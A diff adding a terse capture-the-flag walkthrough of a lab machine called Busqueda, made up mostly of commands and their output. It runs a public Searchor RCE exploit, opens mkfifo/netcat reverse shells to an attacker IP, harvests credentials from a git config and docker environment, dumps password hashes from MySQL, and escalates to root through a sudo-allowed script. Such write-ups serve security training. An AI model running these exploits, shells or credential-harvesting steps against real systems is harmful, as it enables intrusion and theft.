@@ -1,0 +1,306 @@
+——————-
+*Busqueda*
+——————-
+
+$ sudo nmap 10.129.228.217 -sCVS -p- --min-rate 5000
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-04 09:23 EST
+Nmap scan report for 10.129.228.217
+Host is up (0.080s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
+|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://searcher.htb/
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+$ echo 10.129.228.217 searcher.htb | sudo tee -a /etc/hosts
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+$ gobuster dir -u http://searcher.htb -w /usr/share/wordlists/dirb/common.txt -x py,html,zip,pdf -t 100
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://searcher.htb
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              pdf,py,html,zip
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/search               (Status: 405) [Size: 153]
+/server-status        (Status: 403) [Size: 277]
+Progress: 41526 / 41535 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+Flask
+Searchor 2.4.0
+
+CVE-2023-43364 – Searchor RCE
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+$ git clone https://github.com/Herick-Costa/CVE-2023-43364-Searchor-RCE-Exploit.git
+$ cd CVE-2023-43364-Searchor-RCE-Exploit
+$ python3 CVE-2023-43364.py http://searcher.htb/search -a "cat /etc/passwd"
+
+[*] Executando comando custom: cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+sync:x:4:65534:sync:/bin:/bin/sync
+...
+svc:x:1000:1000:svc:/home/svc:/bin/bash
+...
+https://www.google.com/search?q=
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+$ python3 CVE-2023-43364.py http://searcher.htb/search -a "ss -ltnp"
+
+[*] Executando comando custom: ss -ltnp
+State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
+LISTEN 0      4096       127.0.0.1:222        0.0.0.0:*
+LISTEN 0      128        127.0.0.1:5000       0.0.0.0:*    users:(("python3",pid=1572,fd=6),("python3",pid=1572,fd=4))
+LISTEN 0      4096       127.0.0.1:3306       0.0.0.0:*
+LISTEN 0      4096       127.0.0.1:43055      0.0.0.0:*
+LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*
+LISTEN 0      128          0.0.0.0:22         0.0.0.0:*
+LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*
+LISTEN 0      511                *:80               *:*
+LISTEN 0      128             [::]:22            [::]:*
+https://www.google.com/search?q=
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+$ python3 CVE-2023-43364.py http://searcher.htb/search -a "cat ~/user.txt"
+
+[*] Executando comando custom: cat ~/user.txt
+353db1bb082f0e2de0452b282627da69
+https://www.google.com/search?q=
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+$ python3 CVE-2023-43364.py http://searcher.htb/search -a "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.227 4444 >/tmp/f"
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+$ nc -lnvp 4444 -vv
+Listening on 0.0.0.0 4444
+Connection received on 10.129.228.217 49328
+/bin/sh: 0: can't access tty; job control turned off
+
+$ whoami
+svc
+---
+$ ls -lahi
+
+total 20K
+264653 drwxr-xr-x 4 www-data www-data 4.0K Apr  3  2023 .
+ 41701 drwxr-xr-x 4 root     root     4.0K Apr  4  2023 ..
+265511 -rw-r--r-- 1 www-data www-data 1.1K Dec  1  2022 app.py
+327681 drwxr-xr-x 8 www-data www-data 4.0K Nov  4 10:43 .git
+265516 drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 templates
+---
+$ cd .git/
+---
+$ ls -lah
+
+total 52K
+drwxr-xr-x 8 www-data www-data 4.0K Nov  4 10:43 .
+drwxr-xr-x 4 www-data www-data 4.0K Apr  3  2023 ..
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 branches
+-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
+-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
+-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
+-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 hooks
+-rw-r--r-- 1 root     root      259 Apr  3  2023 index
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 info
+drwxr-xr-x 3 www-data www-data 4.0K Dec  1  2022 logs
+drwxr-xr-x 9 www-data www-data 4.0K Dec  1  2022 objects
+drwxr-xr-x 5 www-data www-data 4.0K Dec  1  2022 refs
+---
+$ cat config
+
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[remote "origin"]
+	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+	remote = origin
+	merge = refs/heads/main
+
+username: cody
+password: jh1usoih2bkjaspwe92
+new_host: gitea.searcher.htb
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+$ ssh svc@searcher.htb
+---
+$ sudo -l
+[sudo] password for svc:
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+---
+$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+---
+$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS        PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 years ago   Up 10 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 10 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+---
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db
+
+{"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":[
+"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
+"MYSQL_USER=gitea",
+"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
+"MYSQL_DATABASE=gitea",
+"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"
+],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
+---
+$ mysql --protocol=TCP -h 127.0.0.1 -P 3306 -u root --password='jI86kGUuj87guWr3RyF'
+
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 785
+Server version: 8.0.31 MySQL Community Server - GPL
+
+Copyright (c) 2000, 2023, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql>
+---
+mysql> use gitea
+Database changed
+mysql>
+---
+mysql> show tables;
++---------------------------+
+| Tables_in_gitea           |
++---------------------------+
+.....
+| user                      |
+.....
++---------------------------+
+91 rows in set (0.00 sec)
+---
+mysql> select email, passwd, passwd_hash_algo, salt from user;
++----------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+
+| email                            | passwd                                                                                               | passwd_hash_algo | salt                             |
++----------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+
+| administrator@gitea.searcher.htb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 | pbkdf2           | a378d3f64143b284f104c926b8b49dfb |
+| cody@gitea.searcher.htb          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e | pbkdf2           | d1db0a75a18e50de754be2aafcad5533 |
++----------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+
+2 rows in set (0.00 sec)
+
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+username: administrator
+passhash: ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
+passwd_hash_algo: pbkdf2
+salt: a378d3f64143b284f104c926b8b49dfb
+password: yuiu1hoiu4i5ho1uh
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+svc@busqueda:~$ cd /opt/scripts/
+svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+
+[=] Docker conteainers
+{
+  "/gitea": "running"
+}
+{
+  "/mysql_db": "running"
+}
+
+[=] Docker port mappings
+{
+  "22/tcp": [
+    {
+      "HostIp": "127.0.0.1",
+      "HostPort": "222"
+    }
+  ],
+  "3000/tcp": [
+    {
+      "HostIp": "127.0.0.1",
+      "HostPort": "3000"
+    }
+  ]
+}
+
+[=] Apache webhosts
+[+] searcher.htb is up
+[+] gitea.searcher.htb is up
+
+[=] PM2 processes
+┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
+│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
+├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
+│ 0   │ app    │ default     │ N/A     │ fork    │ 1572     │ 20h    │ 0    │ online    │ 0%       │ 30.0mb   │ svc      │ disabled │
+└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘
+
+[+] Done!
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+$ echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.227 9001 >/tmp/f" > /tmp/full-checkup.sh
+---
+$ chmod +x /tmp/full-checkup.sh
+---
+$ nc -nvlp 9001
+---
+$ cd /tmp
+---
+$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+---
+nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.129.228.217 52068
+---
+# id
+uid=0(root) gid=0(root) groups=0(root)
+---
+# cat /root/root.txt
+a558bced7f91f8270dca02af656eacdc
